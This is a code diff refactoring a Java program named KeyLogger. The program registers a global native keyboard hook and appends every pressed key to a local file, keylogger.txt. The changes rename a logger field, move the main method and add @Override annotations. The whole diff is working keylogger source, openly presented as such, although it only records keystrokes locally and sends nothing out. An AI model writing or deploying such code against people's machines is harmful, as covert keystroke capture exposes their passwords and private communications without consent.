@@ -17,8 +17,19 @@ import static java.lang.System.exit;
 
 public class KeyLogger implements NativeKeyListener{
     public static final Path file = Paths.get("keylogger.txt");
-    public static final Logger target = LoggerFactory.getLogger(KeyLogger.class);
+    public static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
 
+    public static void main(String[] args){
+        try{
+            GlobalScreen.registerNativeHook();
+        }catch (NativeHookException ERROR) {
+            logger.error(ERROR.getMessage(),ERROR);
+            exit(-1);
+        }
+        GlobalScreen.addNativeKeyListener(new KeyLogger());
+    }
+
+    @Override
     public void nativeKeyPressed(NativeKeyEvent event) {
         String keyPress = NativeKeyEvent.getKeyText(event.getKeyCode());
         try(OutputStream keylogger = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
@@ -26,24 +37,18 @@ public class KeyLogger implements NativeKeyListener{
         {
             log.print(keyPress + "\n");
         }catch (IOException ERROR){
-            target.error(ERROR.getMessage(),ERROR);
+            logger.error(ERROR.getMessage(),ERROR);
             exit(-1);
         }
     }
 
+    @Override
     public void nativeKeyReleased(NativeKeyEvent event){
     }
 
+    @Override
     public void nativeKeyTyped(NativeKeyEvent event){
     }
 
-    public static void main(String[] args){
-        try{
-            GlobalScreen.registerNativeHook();
-        }catch (NativeHookException ERROR) {
-            target.error(ERROR.getMessage(),ERROR);
-            exit(-1);
-        }
-        GlobalScreen.addNativeKeyListener(new KeyLogger());
-    }
+
 }
